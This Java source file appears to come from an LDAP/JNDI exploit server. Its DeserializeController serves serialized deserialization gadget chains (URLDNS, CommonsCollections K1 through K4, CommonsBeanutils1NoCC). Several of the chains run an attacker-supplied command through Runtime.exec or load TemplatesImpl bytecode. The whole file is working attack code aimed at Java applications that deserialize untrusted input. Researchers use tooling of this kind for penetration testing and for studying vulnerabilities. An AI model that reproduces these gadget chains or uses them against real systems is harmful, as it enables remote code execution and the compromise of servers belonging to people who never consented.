package com.example.exploit.controller;

import com.example.exploit.Gadgets;
import com.example.exploit.annotation.LdapController;
import com.example.exploit.annotation.LdapMapping;
import com.example.exploit.util.ReflectUtil;
import com.example.exploit.util.SerializeUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Method;
import java.net.URL;
import java.util.*;

@LdapController
@LdapMapping("/Deserialize")
public class DeserializeController {
    @LdapMapping("/URLDNS")
    public byte[] URLDNS(Hashtable<String, String> params) throws Exception {
        String url = params.get("url");

        if (!url.startsWith("http://")) {
            url = "http://" + url;
        }

        HashMap<Object, Object> map = new HashMap<>();
        Method putValMethod = HashMap.class.getDeclaredMethod("putVal", int.class, Object.class, Object.class, boolean.class, boolean.class);
        putValMethod.setAccessible(true);
        putValMethod.invoke(map, 0, new URL(url), 123, false, true);

        System.out.println("[Deserialize] Gadget: URLDNS Url: " + url);
        return SerializeUtil.serialize(map);
    }

    @LdapMapping("/CommonsCollectionsK1")
    public byte[] CommonsCollectionsK1(Hashtable<String, String> params) throws Exception {
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(params);

        InvokerTransformer transformer = new InvokerTransformer("toString",new Class[0], new Object[0]);

        Map innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tme = new TiedMapEntry(m, templatesImpl);

        outerMap.put(tme, "t");
        innerMap.clear();

        ReflectUtil.setFieldValue(transformer, "iMethodName", "newTransformer");

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK1");
        return SerializeUtil.serialize(outerMap);
    }

    @LdapMapping("/CommonsCollectionsK2")
    public byte[] CommonsCollectionsK2(Hashtable<String, String> params) throws Exception {
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(params);

        org.apache.commons.collections4.functors.InvokerTransformer transformer = new org.apache.commons.collections4.functors.InvokerTransformer<>("toString",new Class[0], new Object[0]);

        Map innerMap = new HashMap();
        Map m = org.apache.commons.collections4.map.LazyMap.lazyMap(innerMap, transformer);

        Map outerMap = new HashMap();
        org.apache.commons.collections4.keyvalue.TiedMapEntry tme = new org.apache.commons.collections4.keyvalue.TiedMapEntry(m, templatesImpl);

        outerMap.put(tme, "t");
        innerMap.clear();

        ReflectUtil.setFieldValue(transformer, "iMethodName", "newTransformer");

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK2");
        return SerializeUtil.serialize(outerMap);
    }

    @LdapMapping("/CommonsCollectionsK3")
    public byte[] CommonsCollectionsK3(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map m = LazyMap.decorate(innerMap, transformerChain);

        Map outerMap = new HashMap();
        TiedMapEntry tme = new TiedMapEntry(m, "v");

        outerMap.put(tme, "t");
        innerMap.clear();

        ReflectUtil.setFieldValue(transformerChain, "iTransformers", transformers);

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK3 Cmd: " + cmd);
        return SerializeUtil.serialize(outerMap);
    }

    @LdapMapping("/CommonsCollectionsK4")
    public byte[] CommonsCollectionsK4(Hashtable<String, String> params) throws Exception {
        String cmd = params.get("cmd");

        org.apache.commons.collections4.Transformer[] transformers = new org.apache.commons.collections4.Transformer[]{
                new org.apache.commons.collections4.functors.ConstantTransformer(Runtime.class),
                new org.apache.commons.collections4.functors.InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new org.apache.commons.collections4.functors.InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new org.apache.commons.collections4.functors.InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd}),
                new org.apache.commons.collections4.functors.ConstantTransformer(1)
        };

        org.apache.commons.collections4.Transformer transformerChain = new org.apache.commons.collections4.functors.ChainedTransformer(new org.apache.commons.collections4.Transformer[]{new org.apache.commons.collections4.functors.ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map m = org.apache.commons.collections4.map.LazyMap.lazyMap(innerMap, transformerChain);

        Map outerMap = new HashMap();
        org.apache.commons.collections4.keyvalue.TiedMapEntry tme = new org.apache.commons.collections4.keyvalue.TiedMapEntry(m, "v");

        outerMap.put(tme, "t");
        innerMap.clear();

        ReflectUtil.setFieldValue(transformerChain, "iTransformers", transformers);

        System.out.println("[Deserialize] Gadget: CommonsCollectionsK4 Cmd: " + cmd);
        return SerializeUtil.serialize(outerMap);
    }

    @LdapMapping("/CommonsBeanutils1NoCC")
    public byte[] CommonsBeanutils1NoCC(Hashtable<String, String> params) throws Exception {
        TemplatesImpl templatesImpl = Gadgets.createTemplatesImpl(params);

        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("1");

        beanComparator.setProperty("outputProperties");
        ReflectUtil.setFieldValue(priorityQueue, "queue", new Object[]{templatesImpl, templatesImpl});

        System.out.println("[Deserialize] Gadget: CommonsBeanutils1NoCC");
        return SerializeUtil.serialize(priorityQueue);
    }
}
